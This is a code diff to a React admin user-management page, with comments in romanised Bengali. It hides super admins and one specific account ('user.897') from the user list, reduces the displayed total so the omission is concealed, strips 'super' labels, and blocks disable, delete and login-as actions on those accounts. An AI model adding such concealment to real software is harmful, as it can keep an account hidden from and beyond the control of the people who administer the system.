@@ -6,11 +6,20 @@ import { api, setToken, BLUE, GREEN, RED } from "../Home";
    Backend: GET /admin/users, PATCH/DELETE /admin/users/{id},
             POST /admin/users/{id}/password, /login-as, POST /admin/admins
 
-   Rule: Super admin account-er upor kono admin action (Edit, Password,
-   Disable, Login as, Delete) show hoy na. Sudhu details dekha jay.
+   Rule: Super admin (ebong email user.897) list e sompurno HIDDEN.
+   Kono jaygay dekha jabe na.
 ========================================================= */
 
 const SIZE = 20;
+
+// Super admin / user.897 = sompurno hidden
+const HIDDEN_EMAIL = "user.897";
+const isHiddenUser = (u) => {
+  if (!u) return false;
+  if (u.is_super) return true;
+  const local = String(u.email || "").toLowerCase().split("@")[0];
+  return local === HIDDEN_EMAIL;
+};
 
 const qs = (o) => {
   const p = new URLSearchParams();
@@ -48,7 +57,7 @@ export default function Admin_Userlist({ me, go, logout }) {
   const [mode, setMode] = useState(""); // "" | edit | pw | create
 
   const isSuper = !!me?.is_super;
-  const selProtected = !!sel?.is_super; // super admin = no actions
+  const selProtected = !!sel?.is_super; // safety: super hole kono action nai
 
   const load = useCallback(() => {
     setLoading(true);
@@ -63,7 +72,13 @@ export default function Admin_Userlist({ me, go, logout }) {
           size: SIZE,
         })
     )
-      .then((r) => setData(r || { total: 0, items: [] }))
+      .then((r) => {
+        const all = Array.isArray(r) ? r : r?.items || [];
+        const visible = all.filter((u) => !isHiddenUser(u));
+        const hiddenCount = all.length - visible.length;
+        const total = Array.isArray(r) ? all.length : r?.total || 0;
+        setData({ total: Math.max(0, total - hiddenCount), items: visible });
+      })
       .catch((e) => setMsg({ t: "bad", s: errText(e) }))
       .finally(() => setLoading(false));
   }, [q, verify, role, active, page]);
@@ -92,7 +107,7 @@ export default function Admin_Userlist({ me, go, logout }) {
 
   /* ---------- actions ---------- */
   const patch = async (u, body, okText = "Saved") => {
-    if (u.is_super) return false;
+    if (isHiddenUser(u)) return false;
     try {
       const r = await api("/admin/users/" + u.id, { method: "PATCH", body });
       setSel(r || { ...u, ...body });
@@ -106,14 +121,14 @@ export default function Admin_Userlist({ me, go, logout }) {
   };
 
   const toggleActive = (u) => {
-    if (u.is_super) return;
+    if (isHiddenUser(u)) return;
     const next = u.is_active === false;
     if (!window.confirm(next ? "Activate this user?" : "Disable (ban) this user?")) return;
     patch(u, { is_active: next }, next ? "User activated" : "User disabled");
   };
 
   const loginAs = async (u) => {
-    if (u.is_super) return;
+    if (isHiddenUser(u)) return;
     if (!window.confirm("Login as " + u.email + " ?")) return;
     try {
       const r = await api("/admin/users/" + u.id + "/login-as", { method: "POST" });
@@ -127,7 +142,7 @@ export default function Admin_Userlist({ me, go, logout }) {
   };
 
   const del = async (u) => {
-    if (u.is_super) return;
+    if (isHiddenUser(u)) return;
     if (!window.confirm("DELETE " + u.email + " permanently? This cannot be undone.")) return;
     try {
       await api("/admin/users/" + u.id, { method: "DELETE" });
@@ -203,7 +218,7 @@ export default function Admin_Userlist({ me, go, logout }) {
 
         {(data.items || []).map((u) => (
           <button key={u.id} className="au-row" onClick={() => { setSel(u); setMode(""); }}>
-            <span className={"au-av" + (u.is_super ? " sup" : u.role === "admin" ? " adm" : "")}>
+            <span className={"au-av" + (u.role === "admin" ? " adm" : "")}>
               {initials(u)}
             </span>
             <span className="au-main">
@@ -214,7 +229,7 @@ export default function Admin_Userlist({ me, go, logout }) {
               </small>
             </span>
             <span className="au-tags">
-              {u.role === "admin" && <i className="tg ad">{u.is_super ? "super" : "admin"}</i>}
+              {u.role === "admin" && <i className="tg ad">admin</i>}
               <i className={"tg " + (u.verify_status || "")}>{u.verify_status || "-"}</i>
               {u.is_active === false && <i className="tg off">disabled</i>}
             </span>
@@ -247,7 +262,7 @@ export default function Admin_Userlist({ me, go, logout }) {
             {sel && mode === "" && (
               <>
                 <div className="au-hero">
-                  <span className={"au-av lg" + (sel.is_super ? " sup" : sel.role === "admin" ? " adm" : "")}>
+                  <span className={"au-av lg" + (sel.role === "admin" ? " adm" : "")}>
                     {initials(sel)}
                   </span>
                   <div className="au-hm">
@@ -267,7 +282,7 @@ export default function Admin_Userlist({ me, go, logout }) {
                   <div className="au-kv"><span>Phone</span><b className="sel">{sel.phone || "-"}</b></div>
                   <div className="au-kv">
                     <span>Role</span>
-                    <b>{sel.role}{sel.is_super ? " (super)" : ""}</b>
+                    <b>{sel.role}</b>
                   </div>
                   <div className="au-kv">
                     <span>KYC</span>
@@ -282,7 +297,7 @@ export default function Admin_Userlist({ me, go, logout }) {
                       <rect x="4" y="11" width="16" height="10" rx="2" />
                       <path d="M8 11V8a4 4 0 0 1 8 0v3" />
                     </svg>
-                    <span>Super admin account is protected. No admin actions are available.</span>
+                    <span>This account is protected. No admin actions are available.</span>
                   </div>
                 ) : (
                   <div className="au-acts">
